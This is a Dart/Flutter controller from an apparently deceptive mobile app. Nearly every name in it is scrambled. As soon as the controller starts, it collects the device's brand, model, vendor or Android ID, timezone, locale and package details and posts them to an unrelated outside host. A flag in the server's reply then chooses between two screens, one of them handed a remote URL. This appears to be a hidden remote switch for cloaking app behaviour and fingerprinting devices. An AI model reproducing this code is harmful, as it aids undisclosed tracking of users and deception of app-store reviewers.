import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkReload() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/networkFail");
  }
}

class PageLogic extends GetxController {

  var fdlpojv = RxBool(false);
  var pnzibca = RxBool(true);
  var hkoafux = RxString("");
  var alexanne = RxBool(false);
  var effertz = RxBool(true);
  final mubtkcsxf = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkReload();
    super.onInit();
    kwrviux();
  }


  Future<void> kwrviux() async {

    alexanne.value = true;
    effertz.value = true;
    pnzibca.value = false;

    mubtkcsxf.post("https://free.alcbup.cc/chkujiyovnswdmfrxlgpzqatb",data: await hzjeidm()).then((value) {
      var emifnvb = value.data["emifnvb"] as String;
      var ixdofkwe = value.data["ixdofkwe"] as bool;
      if (ixdofkwe) {
        hkoafux.value = emifnvb;
        jadyn();
      } else {
        turner();
      }
    }).catchError((e) {
      pnzibca.value = true;
      effertz.value = true;
      alexanne.value = false;
    });
  }

  Future<Map<String, dynamic>> hzjeidm() async {
    final DeviceInfoPlugin nlgcpo = DeviceInfoPlugin();
    PackageInfo jgivxsa_bliotryd = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var yktgec = Platform.localeName;
    var yc_iVmGlyS = currentTimeZone;

    var yc_pws = jgivxsa_bliotryd.packageName;
    var yc_oA = jgivxsa_bliotryd.version;
    var yc_AZJf = jgivxsa_bliotryd.buildNumber;

    var yc_TN = jgivxsa_bliotryd.appName;
    var yc_xBWXgP = "";
    var rashawnKoelpin = "";
    var yc_EL = "";
    var eliasRodriguez = "";
    var ricardoFeil = "";
    var yc_pXxKF  = "";
    var zackaryKling = "";


    var jillianPredovic = "";
    var yc_SAQfBdTE = "";
    var yc_yfJEHML = false;

    if (GetPlatform.isAndroid) {
      yc_SAQfBdTE = "android";
      var ubjfdavrsi = await nlgcpo.androidInfo;

      yc_EL = ubjfdavrsi.brand;

      yc_xBWXgP  = ubjfdavrsi.model;
      yc_pXxKF = ubjfdavrsi.id;

      yc_yfJEHML = ubjfdavrsi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      yc_SAQfBdTE = "ios";
      var qzghuaft = await nlgcpo.iosInfo;
      yc_EL = qzghuaft.name;
      yc_xBWXgP = qzghuaft.model;

      yc_pXxKF = qzghuaft.identifierForVendor ?? "";
      yc_yfJEHML  = qzghuaft.isPhysicalDevice;
    }
    var res = {
      "yc_AZJf": yc_AZJf,
      "yc_oA": yc_oA,
      "yc_pws": yc_pws,
      "ricardoFeil" : ricardoFeil,
      "yc_xBWXgP": yc_xBWXgP,
      "yc_iVmGlyS": yc_iVmGlyS,
      "rashawnKoelpin" : rashawnKoelpin,
      "yc_EL": yc_EL,
      "yc_pXxKF": yc_pXxKF,
      "yc_SAQfBdTE": yc_SAQfBdTE,
      "yc_TN": yc_TN,
      "yktgec": yktgec,
      "yc_yfJEHML": yc_yfJEHML,
      "eliasRodriguez" : eliasRodriguez,
      "jillianPredovic" : jillianPredovic,
      "zackaryKling" : zackaryKling,

    };
    return res;
  }

  Future<void> turner() async {
    Get.offAllNamed("/leastTab");
  }

  Future<void> jadyn() async {
    Get.offAllNamed("/leaseTool");
  }

}
